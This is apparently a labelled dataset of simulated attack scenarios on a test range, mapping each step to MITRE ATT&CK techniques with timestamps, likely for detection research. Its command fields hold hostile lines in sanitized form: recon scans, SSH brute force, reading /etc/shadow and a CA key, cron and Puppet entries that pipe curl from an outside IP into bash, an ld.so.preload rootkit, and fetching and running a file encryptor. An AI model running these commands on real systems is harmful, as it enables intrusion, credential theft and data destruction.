scenario;tactics;techniques;technique_names;event_id;cmd;start;end
1_sudo_sshkey;discoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscovery;T1087_T1083_T1201_T1069_T1057_T1518_T1082_T1614_T1016_T1049_T1033_T1007_T1615;NA;13;__linpeas_sh__s__q__N_2___dev_null;1758531971.077967;1758532578.0
1_sudo_sshkey;discovery;T1033;NA;14;id;1758532587.452316;1758532593.0
1_sudo_sshkey;privilege-escalation_defense-evasion;T1548.003;NA;53;dmesg__H;1758532602.660471;1758532608.0
1_sudo_sshkey;privilege-escalation_defense-evasion;T1548.003;NA;54;_bash;1758532617.86944;1758532625.0
1_sudo_sshkey;discovery;T1033;NA;37;id;1758532634.195304;1758532641.0
1_sudo_sshkey;command-and-controlpersistence_privilege-escalation;T1105_T1098.004;NA;43;cd__root__wget_http___192_42_1_174_README_txt;1758532650.518286;1758532657.0
1_sudo_sshkey;defense-evasionpersistence_privilege-escalation;T1218_T1098.004;NA;44;split___filter__cat__FILE___xargs_bash__c____C_2000_README_txt;1758532666.88568;1758532674.0
1_sudo_sshkey;defense-evasion;T1070.004;NA;40;rm;1758532683.212947;1758532690.0
1_sudo_sshkey;defense-evasion;T1070.004;NA;40;rm;1758532715.833989;1758532753.0
1_sudo_sshkey;discovery;T1033;NA;23;id;1758532778.522499;1758532785.0
1_sudo_sshkey;credential-access;T1003.008;NA;24;cat__etc_shadow;1758532809.131265;1758532815.0
1_sudo_sshkey;discovery;T1120;NA;25;lspci;1758532824.155779;1758532830.0
1_sudo_sshkey;discovery;T1120;NA;26;command__v_lsusb;1758532839.193775;1758532845.0
1_sudo_sshkey;discovery;T1124;NA;27;date;1758532854.218426;1758532860.0
1_sudo_sshkey;defense-evasion_discovery;T1497.001;NA;28;find__usr__name___virtualbox__;1758532869.240422;1758532905.0
1_validaccount_localaccount;reconnaissancereconnaissance;T1590.002_T1591;NA;1;dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com;1758713241.782522;1758713251.0
1_validaccount_localaccount;reconnaissancereconnaissance;T1595_T1592.002;NA;2;nmap__O__sT___top_ports_100_video_attackbed_com;1758713260.406734;1758713279.0
1_validaccount_localaccount;reconnaissance;T1595.002;NA;3;nikto__host_video_attackbed_com;1758713288.496653;1758713339.0
1_validaccount_localaccount;reconnaissance;T1595.003;NA;4;ffuf__w__usr_local_share_SecLists_Discovery_Web_Content_raft_small_directories_lowercase_txt__u_http___video_attackbed_com_FUZZ;1758713348.407251;1758713449.0
1_validaccount_localaccount;initial-accessexecution;T1190_T1059.006;NA;5;exploit_unix_webapp_zoneminder_snapshots;1758713458.936916;1758713514.0
1_validaccount_localaccount;command-and-control;T1105;NA;6;upload__var_www_html_linpeas_sh;1758713540.006966;1758713547.0
1_validaccount_localaccount;execution;T1059;NA;7;python3__c__import_pty_pty_spawn___bash_____;1758713572.703169;1758713580.0
1_validaccount_localaccount;execution;T1059;NA;8;export_SHELL_bash;1758713589.070855;1758713596.0
1_validaccount_localaccount;execution;T1059;NA;9;export_TERM_xterm256_color;1758713605.439087;1758713612.0
1_validaccount_localaccount;execution;T1059;NA;10;stty_rows_38_columns_116;1758713621.796145;1758713629.0
1_validaccount_localaccount;execution;T1059;NA;11;export_PS1__PWN__;1758713638.161183;1758713645.0
1_validaccount_localaccount;execution;T1059;NA;12;chmod__x_linpeas_sh;1758713654.527597;1758713661.0
1_validaccount_localaccount;discoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscovery;T1087_T1083_T1201_T1069_T1057_T1518_T1082_T1614_T1016_T1049_T1033_T1007_T1615;NA;13;__linpeas_sh__s__q__N_2___dev_null;1758713670.749285;1758714278.0
1_validaccount_localaccount;discovery;T1033;NA;14;id;1758714287.024414;1758714293.0
1_validaccount_localaccount;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;55;find__home__ls;1758714302.167485;1758714309.0
1_validaccount_localaccount;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;56;ssh__i__home_webdev__ssh_id_rsa__o__StrictHostKeyChecking_no__root_localhost;1758714318.523535;1758714325.0
1_validaccount_localaccount;discovery;T1033;NA;37;id;1758714334.892435;1758714342.0
1_validaccount_localaccount;command-and-controlpersistence;T1105_T1136.001;NA;38;cd__root__wget__O_README_txt_http___192_42_1_174_README_txt_2;1758714351.253608;1758714358.0
1_validaccount_localaccount;defense-evasionpersistence;T1218_T1136.001;NA;39;split___filter__cat__FILE___xargs_bash__c____C_2000_README_txt;1758714367.615004;1758714374.0
1_validaccount_localaccount;defense-evasion;T1070.004;NA;40;rm;1758714383.984853;1758714391.0
1_validaccount_localaccount;defense-evasion;T1070.004;NA;40;rm;1758714400.157375;1758714437.0
1_validaccount_localaccount;discovery;T1033;NA;23;id;1758714479.227718;1758714485.0
1_validaccount_localaccount;credential-access;T1003.008;NA;24;cat__etc_shadow;1758714509.829388;1758714515.0
1_validaccount_localaccount;discovery;T1120;NA;25;lspci;1758714524.864605;1758714530.0
1_validaccount_localaccount;discovery;T1120;NA;26;command__v_lsusb;1758714539.912037;1758714545.0
1_validaccount_localaccount;discovery;T1124;NA;27;date;1758714554.948713;1758714560.0
1_validaccount_localaccount;defense-evasion_discovery;T1497.001;NA;28;find__usr__name___virtualbox__;1758714569.959464;1758714606.0
1_validaccount_pam;reconnaissancereconnaissance;T1590.002_T1591;NA;1;dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com;1758717284.146778;1758717295.0
1_validaccount_pam;reconnaissancereconnaissance;T1595_T1592.002;NA;2;nmap__O__sT___top_ports_100_video_attackbed_com;1758717304.516073;1758717323.0
1_validaccount_pam;reconnaissance;T1595.002;NA;3;nikto__host_video_attackbed_com;1758717332.66652;1758717383.0
1_validaccount_pam;reconnaissance;T1595.003;NA;4;ffuf__w__usr_local_share_SecLists_Discovery_Web_Content_raft_small_directories_lowercase_txt__u_http___video_attackbed_com_FUZZ;1758717392.096445;1758717493.0
1_validaccount_pam;initial-accessexecution;T1190_T1059.006;NA;5;exploit_unix_webapp_zoneminder_snapshots;1758717503.086718;1758717560.0
1_validaccount_pam;command-and-control;T1105;NA;6;upload__var_www_html_linpeas_sh;1758717585.669605;1758717592.0
1_validaccount_pam;execution;T1059;NA;7;python3__c__import_pty_pty_spawn___bash_____;1758717618.36627;1758717625.0
1_validaccount_pam;execution;T1059;NA;8;export_SHELL_bash;1758717634.734932;1758717642.0
1_validaccount_pam;execution;T1059;NA;9;export_TERM_xterm256_color;1758717651.009745;1758717658.0
1_validaccount_pam;execution;T1059;NA;10;stty_rows_38_columns_116;1758717667.260852;1758717674.0
1_validaccount_pam;execution;T1059;NA;11;export_PS1__PWN__;1758717683.459196;1758717690.0
1_validaccount_pam;execution;T1059;NA;12;chmod__x_linpeas_sh;1758717699.830447;1758717707.0
1_validaccount_pam;discoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscovery;T1087_T1083_T1201_T1069_T1057_T1518_T1082_T1614_T1016_T1049_T1033_T1007_T1615;NA;13;__linpeas_sh__s__q__N_2___dev_null;1758717716.12164;1758718323.0
1_validaccount_pam;discovery;T1033;NA;14;id;1758718332.499722;1758718338.0
1_validaccount_pam;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;55;find__home__ls;1758718347.704403;1758718355.0
1_validaccount_pam;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;56;ssh__i__home_webdev__ssh_id_rsa__o__StrictHostKeyChecking_no__root_localhost;1758718364.024622;1758718371.0
1_validaccount_pam;discovery;T1033;NA;37;id;1758718380.401225;1758718387.0
1_validaccount_pam;command-and-controlcredential-access_defense-evasion_persistence;T1105_T1556.003;NA;41;cd__root__wget__O_README_txt_http___192_42_1_174_README_txt_4;1758718396.772021;1758718404.0
1_validaccount_pam;defense-evasioncredential-access_defense-evasion_persistence;T1218_T1556.003;NA;42;split___filter__cat__FILE___xargs_bash__c____C_2000_README_txt;1758718413.02104;1758718420.0
1_validaccount_pam;defense-evasion;T1070.004;NA;40;rm;1758718429.389797;1758718436.0
1_validaccount_pam;defense-evasion;T1070.004;NA;40;rm;1758718445.575844;1758718482.0
1_validaccount_pam;discovery;T1033;NA;23;id;1758718524.599995;1758718530.0
1_validaccount_pam;credential-access;T1003.008;NA;24;cat__etc_shadow;1758718554.861902;1758718560.0
1_validaccount_pam;discovery;T1120;NA;25;lspci;1758718569.900028;1758718575.0
1_validaccount_pam;discovery;T1120;NA;26;command__v_lsusb;1758718584.947052;1758718590.0
1_validaccount_pam;discovery;T1124;NA;27;date;1758718599.978621;1758718605.0
1_validaccount_pam;defense-evasion_discovery;T1497.001;NA;28;find__usr__name___virtualbox__;1758718614.992143;1758718651.0
1_validaccount_sshkey;reconnaissancereconnaissance;T1590.002_T1591;NA;1;dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com;1758710002.790124;1758710012.0
1_validaccount_sshkey;reconnaissancereconnaissance;T1595_T1592.002;NA;2;nmap__O__sT___top_ports_100_video_attackbed_com;1758710021.553779;1758710040.0
1_validaccount_sshkey;reconnaissance;T1595.002;NA;3;nikto__host_video_attackbed_com;1758710049.675755;1758710100.0
1_validaccount_sshkey;reconnaissance;T1595.003;NA;4;ffuf__w__usr_local_share_SecLists_Discovery_Web_Content_raft_small_directories_lowercase_txt__u_http___video_attackbed_com_FUZZ;1758710109.737989;1758710211.0
1_validaccount_sshkey;initial-accessexecution;T1190_T1059.006;NA;5;exploit_unix_webapp_zoneminder_snapshots;1758710220.489091;1758710279.0
1_validaccount_sshkey;command-and-control;T1105;NA;6;upload__var_www_html_linpeas_sh;1758710304.912918;1758710312.0
1_validaccount_sshkey;execution;T1059;NA;7;python3__c__import_pty_pty_spawn___bash_____;1758710337.647834;1758710344.0
1_validaccount_sshkey;execution;T1059;NA;8;export_SHELL_bash;1758710353.979436;1758710361.0
1_validaccount_sshkey;execution;T1059;NA;9;export_TERM_xterm256_color;1758710370.225498;1758710377.0
1_validaccount_sshkey;execution;T1059;NA;10;stty_rows_38_columns_116;1758710386.558593;1758710393.0
1_validaccount_sshkey;execution;T1059;NA;11;export_PS1__PWN__;1758710402.802055;1758710410.0
1_validaccount_sshkey;execution;T1059;NA;12;chmod__x_linpeas_sh;1758710419.117212;1758710426.0
1_validaccount_sshkey;discoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscovery;T1087_T1083_T1201_T1069_T1057_T1518_T1082_T1614_T1016_T1049_T1033_T1007_T1615;NA;13;__linpeas_sh__s__q__N_2___dev_null;1758710435.39247;1758711042.0
1_validaccount_sshkey;discovery;T1033;NA;14;id;1758711051.758545;1758711057.0
1_validaccount_sshkey;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;55;find__home__ls;1758711066.997499;1758711074.0
1_validaccount_sshkey;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;56;ssh__i__home_webdev__ssh_id_rsa__o__StrictHostKeyChecking_no__root_localhost;1758711083.319104;1758711090.0
1_validaccount_sshkey;discovery;T1033;NA;37;id;1758711099.707471;1758711107.0
1_validaccount_sshkey;command-and-controlpersistence_privilege-escalation;T1105_T1098.004;NA;43;cd__root__wget_http___192_42_1_174_README_txt;1758711116.08778;1758711123.0
1_validaccount_sshkey;defense-evasionpersistence_privilege-escalation;T1218_T1098.004;NA;44;split___filter__cat__FILE___xargs_bash__c____C_2000_README_txt;1758711132.467808;1758711139.0
1_validaccount_sshkey;defense-evasion;T1070.004;NA;40;rm;1758711148.778325;1758711156.0
1_validaccount_sshkey;defense-evasion;T1070.004;NA;40;rm;1758711165.005334;1758711202.0
1_validaccount_sshkey;discovery;T1033;NA;23;id;1758711244.067281;1758711250.0
1_validaccount_sshkey;credential-access;T1003.008;NA;24;cat__etc_shadow;1758711274.668935;1758711280.0
1_validaccount_sshkey;discovery;T1120;NA;25;lspci;1758711289.693129;1758711295.0
1_validaccount_sshkey;discovery;T1120;NA;26;command__v_lsusb;1758711304.73999;1758711310.0
1_validaccount_sshkey;discovery;T1124;NA;27;date;1758711319.769071;1758711325.0
1_validaccount_sshkey;defense-evasion_discovery;T1497.001;NA;28;find__usr__name___virtualbox__;1758711334.793252;1758711370.0
2_cron;lateral-movement;T1021.004;NA;1;hostname;1759313652.955559;1759313659.0
2_cron;command-and-controlcommand-and-control;T1071.001_T1573.001;NA;2;start_https_listener;1759313698.689764;1759313704.0
2_cron;command-and-control;T1105;NA;3;put;1759313729.002694;1759313735.0
2_cron;persistence_privilege-escalationexecution;T1547_T1569;NA;4;sed__i__s_____bin__sh_____bin__sh_n__usr__bin__zmcontroller____n____usr_share_awffull_awffull;1759313744.147666;1759313750.0
2_cron;discovery;T1083;NA;5;ls;1759313759.232391;1759314606.0
2_cron;discovery;T1057;NA;6;ps;1759314615.295482;1759314621.0
2_cron;discovery;T1007;NA;7;__d_____mariadb;1759314630.356325;1759314636.0
2_cron;credential-access;T1003;NA;8;process_dump;1759314660.405776;1759314666.0
2_cron;discovery;T1049;NA;9;netstat;1759314675.862978;1759314681.0
2_cron;discovery;T1016;NA;10;ifconfig;1759314690.953936;1759314697.0
2_cron;credential-accessexfiltration;T1003.008_T1041;NA;11;download;1759314721.048554;1759314727.0
2_cron;collectioncollection;T1560.001_T1074.001;NA;12;execute;1759314736.107786;1759314742.0
2_cron;exfiltration;T1041;NA;13;download;1759314781.186505;1759314787.0
2_cron;defense-evasion;T1070.004;NA;14;rm;1759314796.25383;1759314802.0
2_cron;collection;T1005;NA;15;download;1759314811.306144;1759314817.0
2_cron;discovery;T1201;NA;16;execute;1759314826.367095;1759314832.0
2_cron;credential-access;T1003.008;NA;17;execute;1759314841.431046;1759314847.0
2_cron;discovery;T1201;NA;18;execute;1759314856.490044;1759314862.0
2_cron;command-and-controldiscoverydiscovery;T1105_T1046_T1018;NA;19;upload;1759314871.560183;1759314878.0
2_cron;discoverydiscovery;T1046_T1018;NA;20;execute;1759314887.136502;1759314893.0
2_cron;discoverydiscovery;T1046_T1018;NA;21;execute;1759314902.19049;1759314940.0
2_rootkit;lateral-movement;T1021;NA;22;id;1759318379.085449;1759318385.0
2_rootkit;command-and-control;T1105;NA;23;put;1759318448.398417;1759318454.0
2_rootkit;command-and-controlcommand-and-control;T1071.001_T1573;NA;24;start_https_listener;1759318507.752769;1759318513.0
2_rootkit;command-and-control;T1105;NA;3;put;1759318537.995395;1759318544.0
2_rootkit;persistence_privilege-escalation;T1543.002;NA;25;ExecStartPre_sudo__g_fax_bash__c__zmcontroller__;1759318673.179342;1759318694.0
2_rootkit;persistence_privilege-escalation;T1543.002;NA;26;_wq__;1759318733.198081;1759318739.0
2_rootkit;defense-evasiondefense-evasionpersistence_privilege-escalation_defense-evasion;T1014_T1564_T1574;NA;27;echo__usr_lib_selinux_so_3_____etc_ld_so_preload;1759318748.252204;1759318754.0
2_rootkit;persistence_privilege-escalation;T1543.002;NA;28;systemctl_daemon_reload;1759318763.266434;1759318769.0
2_rootkit;persistence_privilege-escalation;T1543.002;NA;29;systemctl_restart_zoneminder_service;1759318778.554074;1759318788.0
2_rootkit;discovery;T1083;NA;5;ls;1759318797.201025;1759318803.0
2_rootkit;discovery;T1057;NA;6;ps;1759318812.270203;1759318818.0
2_rootkit;discovery;T1007;NA;7;__d_____mariadb;1759318827.321367;1759318833.0
2_rootkit;credential-access;T1003;NA;8;process_dump;1759318857.361178;1759318863.0
2_rootkit;discovery;T1049;NA;9;netstat;1759318872.792447;1759318878.0
2_rootkit;discovery;T1016;NA;10;ifconfig;1759318887.884125;1759318893.0
2_rootkit;credential-accessexfiltration;T1003.008_T1041;NA;11;download;1759318917.953859;1759318923.0
2_rootkit;collectioncollection;T1560.001_T1074.001;NA;12;execute;1759318933.022466;1759318939.0
2_rootkit;exfiltration;T1041;NA;13;download;1759318978.106077;1759318984.0
2_rootkit;defense-evasion;T1070.004;NA;14;rm;1759318993.174262;1759318999.0
2_rootkit;collection;T1005;NA;15;download;1759319008.221606;1759319014.0
2_rootkit;discovery;T1201;NA;16;execute;1759319023.29192;1759319029.0
2_rootkit;credential-access;T1003.008;NA;17;execute;1759319038.347218;1759319044.0
2_rootkit;discovery;T1201;NA;18;execute;1759319053.411112;1759319059.0
2_rootkit;command-and-controldiscoverydiscovery;T1105_T1046_T1018;NA;19;upload;1759319068.489481;1759319074.0
2_rootkit;discoverydiscovery;T1046_T1018;NA;20;execute;1759319083.954815;1759319089.0
2_rootkit;discoverydiscovery;T1046_T1018;NA;21;execute;1759319099.002546;1759319137.0
3_ssh_apt;defense-evasion_persistence_privilege-escalation_initial-accesscredential-accesspersistence_initial-access;T1078.002_T1110.001_T1133;NA;1;hydra__C_user_pass_combo_txt__s_10022_fw_attackbed_com_ssh;1765535300.69319;1765535316.0
3_ssh_apt;defense-evasion_persistence_privilege-escalation_initial-access;T1078.002;NA;2;id;1765535321.802248;1765535331.0
3_ssh_apt;credential-access_discovery;T1040;NA;3;tcpdump__A_port_21_;1765535337.926744;1765535364.0
3_ssh_apt;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;4;_i_;1765535388.037143;1765535394.0
3_ssh_apt;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;5;rambo_;1765535403.044203;1765535409.0
3_ssh_apt;credential-access;T1003.008;NA;6;cat__etc_shadow_;1765535433.052241;1765535439.0
3_ssh_apt;collection;T1213;NA;7;cat__etc_puppetlabs_puppetserver_ca_ca_key_pem_;1765535448.058127;1765535454.0
3_ssh_apt;collection;T1039;NA;8;cat__media_share_healthcheck_cron_sh_;1765535463.062878;1765535469.0
3_ssh_apt;discovery;T1083;NA;9;ls__l__var_www_html_debian_;1765535548.613553;1765535554.0
3_ssh_apt;execution;T1059.004;NA;10;apt_update____apt_install__y_dpkg_dev_;1765535563.621796;1765535589.0
3_ssh_apt;defense-evasiondefense-evasion;T1036.005_T1564.001;NA;11;mkdir__tmp__tmux_data_;1765535598.630661;1765535604.0
3_ssh_apt;persistence_privilege-escalation_defense-evasion;T1574;NA;12;dpkg_deb__R__var_www_html_debian_healthcheckd_1_0_1_amd64_deb_healthcheckd_;1765535628.640719;1765535634.0
3_ssh_apt;executionpersistence_privilege-escalation_defense-evasion;T1059_T1574;NA;13;__s_1_0_1_1_0_2_g_;1765535673.650525;1765535694.0
3_ssh_apt;executionpersistence_privilege-escalation_defense-evasion;T1059_T1574;NA;14;_wq_;1765535703.654988;1765535709.0
3_ssh_apt;execution_persistence_privilege-escalationcommand-and-controlcommand-and-control;T1053.003_T1105_T1071.001;NA;15;echo____5_________root_curl_http___192_42_1_174_8888_install_sh___bash_____etc_cron_d_health;1765535808.731411;1765535829.0
3_ssh_apt;execution_persistence_privilege-escalationcommand-and-controlcommand-and-control;T1053.003_T1105_T1071.001;NA;16;_wq_;1765535868.743981;1765535874.0
3_ssh_apt;execution_lateral-movement;T1072;NA;17;dpkg_deb__b_healthcheckd__var_www_html_debian_healthcheckd_1_0_2_amd64_deb_;1765535898.844715;1765535905.0
3_ssh_apt;execution_lateral-movement;T1072;NA;18;dpkg_scanpackages_____gzip__c9____Packages_gz_;1765535929.057214;1765536115.0
3_ssh_apt;execution;T1059;NA;19;shell;1765536337.950733;1765536345.0
3_ssh_apt;execution;T1059;NA;20;python3__c__import_pty_pty_spawn___bash_____;1765536354.275887;1765536361.0
3_ssh_apt;execution;T1059;NA;21;export_SHELL_bash;1765536370.648064;1765536378.0
3_ssh_apt;execution;T1059;NA;22;export_TERM_xterm256_color;1765536387.018547;1765536394.0
3_ssh_apt;execution;T1059;NA;23;stty_rows_38_columns_116;1765536403.398399;1765536410.0
3_ssh_apt;execution;T1059;NA;24;export_PS1__PWN__;1765536419.72217;1765536427.0
3_ssh_apt;impactcommand-and-control;T1486_T1105;NA;25;curl_http___192_42_1_174_donotcry___donotcry;1765536436.091378;1765536443.0
3_ssh_apt;impactimpact;T1486_T1565.001;NA;26;_lib64_ld_linux_x86_64_so_2_donotcry_encrypt__media_data_Images;1765536452.463304;1765536462.0
3_ssh_apt;discovery;T1018;NA;27;find__media_data_Images;1765536468.850467;1765536476.0
3_ssh_apt;discovery;T1087.001;NA;28;cat__etc_passwd;1765536485.171055;1765536492.0
3_ssh_apt;impact;T1531;NA;29;userdel__f_john;1765536501.35968;1765536508.0
3_ssh_apt;impact;T1485;NA;30;rm;1765536517.724594;1765536525.0
3_ssh_apt;impact;T1490;NA;31;rm;1765536534.092586;1765536541.0
3_ssh_apt;impact;T1489;NA;32;systemctl_stop_exim4_service;1765536550.468733;1765536587.0
3_ssh_healthcheck;defense-evasion_persistence_privilege-escalation_initial-accesscredential-accesspersistence_initial-access;T1078.002_T1110.001_T1133;NA;1;hydra__C_user_pass_combo_txt__s_10022_fw_attackbed_com_ssh;1765463281.325538;1765463299.0
3_ssh_healthcheck;defense-evasion_persistence_privilege-escalation_initial-access;T1078.002;NA;2;id;1765463304.641907;1765463315.0
3_ssh_healthcheck;credential-access_discovery;T1040;NA;3;tcpdump__A_port_21_;1765463321.239447;1765463347.0
3_ssh_healthcheck;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;4;_i_;1765463371.329143;1765463377.0
3_ssh_healthcheck;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;5;rambo_;1765463386.333807;1765463392.0
3_ssh_healthcheck;credential-access;T1003.008;NA;6;cat__etc_shadow_;1765463416.342266;1765463422.0
3_ssh_healthcheck;collection;T1213;NA;7;cat__etc_puppetlabs_puppetserver_ca_ca_key_pem_;1765463431.344369;1765463437.0
3_ssh_healthcheck;collection;T1039;NA;8;cat__media_share_healthcheck_cron_sh_;1765463446.346903;1765463452.0
3_ssh_healthcheck;lateral-movement;T1080;NA;33;curl_http___192_42_1_174_8888_install_sh___bash_;1765463606.9038;1765463627.0
3_ssh_healthcheck;lateral-movement;T1080;NA;34;_wq_;1765463666.915997;1765463672.0
3_ssh_healthcheck;discovery;T1082;NA;35;sysinfo;1765463682.148525;1765464011.0
3_ssh_healthcheck;discovery;T1033;NA;36;getuid;1765464020.967379;1765464028.0
3_ssh_healthcheck;execution;T1059;NA;19;shell;1765464068.597781;1765464075.0
3_ssh_healthcheck;execution;T1059;NA;20;python3__c__import_pty_pty_spawn___bash_____;1765464084.867733;1765464092.0
3_ssh_healthcheck;execution;T1059;NA;21;export_SHELL_bash;1765464101.259166;1765464108.0
3_ssh_healthcheck;execution;T1059;NA;22;export_TERM_xterm256_color;1765464117.526284;1765464124.0
3_ssh_healthcheck;execution;T1059;NA;23;stty_rows_38_columns_116;1765464133.862131;1765464141.0
3_ssh_healthcheck;execution;T1059;NA;24;export_PS1__PWN__;1765464150.191734;1765464157.0
3_ssh_healthcheck;impactcommand-and-control;T1486_T1105;NA;25;curl_http___192_42_1_174_donotcry___donotcry;1765464166.532105;1765464173.0
3_ssh_healthcheck;impactimpact;T1486_T1565.001;NA;26;_lib64_ld_linux_x86_64_so_2_donotcry_encrypt__media_data_Images;1765464182.799603;1765464193.0
3_ssh_healthcheck;discovery;T1018;NA;27;find__media_data_Images;1765464199.182172;1765464206.0
3_ssh_healthcheck;discovery;T1087.001;NA;28;cat__etc_passwd;1765464215.508982;1765464222.0
3_ssh_healthcheck;impact;T1531;NA;29;userdel__f_john;1765464231.795879;1765464239.0
3_ssh_healthcheck;impact;T1485;NA;30;rm;1765464248.132123;1765464255.0
3_ssh_healthcheck;impact;T1490;NA;31;rm;1765464264.503554;1765464271.0
3_ssh_healthcheck;impact;T1489;NA;32;systemctl_stop_exim4_service;1765464280.830944;1765464318.0
3_ssh_puppet;defense-evasion_persistence_privilege-escalation_initial-accesscredential-accesspersistence_initial-access;T1078.002_T1110.001_T1133;NA;1;hydra__C_user_pass_combo_txt__s_10022_fw_attackbed_com_ssh;1765543351.203732;1765543367.0
3_ssh_puppet;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;37;id;1765543372.103696;1765543379.0
3_ssh_puppet;credential-access_discovery;T1040;NA;3;tcpdump__A_port_21_;1765543388.379478;1765543414.0
3_ssh_puppet;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;4;_i_;1765543438.489389;1765543444.0
3_ssh_puppet;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;5;rambo_;1765543453.494358;1765543459.0
3_ssh_puppet;credential-access;T1003.008;NA;6;cat__etc_shadow_;1765543483.50118;1765543489.0
3_ssh_puppet;collection;T1213;NA;7;cat__etc_puppetlabs_puppetserver_ca_ca_key_pem_;1765543498.506932;1765543504.0
3_ssh_puppet;collection;T1039;NA;8;cat__media_share_healthcheck_cron_sh_;1765543513.513759;1765543519.0
3_ssh_puppet;execution_lateral-movementcommand-and-controlexecution;T1072_T1105_T1059.004;NA;38;class_blah2___exec____curl_http___192_42_1_174_8888_install_sh___bash______path_______usr_bin____bin________;1765543644.092969;1765543665.0
3_ssh_puppet;execution_lateral-movementcommand-and-controlexecution;T1072_T1105_T1059.004;NA;39;node__linuxshare_attackbed_local______class____blah2_______;1765543674.097812;1765543695.0
3_ssh_puppet;execution_lateral-movementcommand-and-controlexecution;T1072_T1105_T1059.004;NA;40;_wq_;1765543734.107628;1765543920.0
3_ssh_puppet;execution;T1059;NA;19;shell;1765543930.278885;1765543937.0
3_ssh_puppet;execution;T1059;NA;20;python3__c__import_pty_pty_spawn___bash_____;1765543946.524163;1765543953.0
3_ssh_puppet;execution;T1059;NA;21;export_SHELL_bash;1765543962.809181;1765543970.0
3_ssh_puppet;execution;T1059;NA;22;export_TERM_xterm256_color;1765543979.032961;1765543986.0
3_ssh_puppet;execution;T1059;NA;23;stty_rows_38_columns_116;1765543995.403999;1765544002.0
3_ssh_puppet;execution;T1059;NA;24;export_PS1__PWN__;1765544011.731326;1765544019.0
3_ssh_puppet;impactcommand-and-control;T1486_T1105;NA;25;curl_http___192_42_1_174_donotcry___donotcry;1765544028.10069;1765544035.0
3_ssh_puppet;impactimpact;T1486_T1565.001;NA;26;_lib64_ld_linux_x86_64_so_2_donotcry_encrypt__media_data_Images;1765544044.419965;1765544055.0
3_ssh_puppet;discovery;T1018;NA;27;find__media_data_Images;1765544061.795878;1765544069.0
3_ssh_puppet;discovery;T1087.001;NA;28;cat__etc_passwd;1765544078.134093;1765544085.0
3_ssh_puppet;impact;T1531;NA;29;userdel__f_john;1765544094.47707;1765544101.0
3_ssh_puppet;impact;T1485;NA;30;rm;1765544110.8049;1765544118.0
3_ssh_puppet;impact;T1490;NA;31;rm;1765544127.187437;1765544134.0
3_ssh_puppet;impact;T1489;NA;32;systemctl_stop_exim4_service;1765544143.56019;1765544180.0
3_vnc_apt;credential-accesslateral-movement;T1110.001_T1021.005;NA;41;items_LISTA_;1765562942.102559;1765562963.0
3_vnc_apt;lateral-movement;T1021.005;NA;42;click;1765562972.236494;1765562981.0
3_vnc_apt;lateral-movement;T1021.005;NA;43;terminal;1765562990.251434;1765563002.0
3_vnc_apt;lateral-movement;T1021.005;NA;44;sudo__i;1765563026.269497;1765563045.0
3_vnc_apt;credential-access;T1003.008;NA;45;key;1765563114.315146;1765563125.0
3_vnc_apt;collection;T1213;NA;46;key;1765563149.336021;1765563160.0
3_vnc_apt;collection;T1039;NA;47;key;1765563184.355962;1765563192.0
3_vnc_apt;discovery;T1083;NA;48;key;1765563216.369842;1765563222.0
3_vnc_apt;execution;T1059.004;NA;49;key;1765563246.384436;1765563612.0
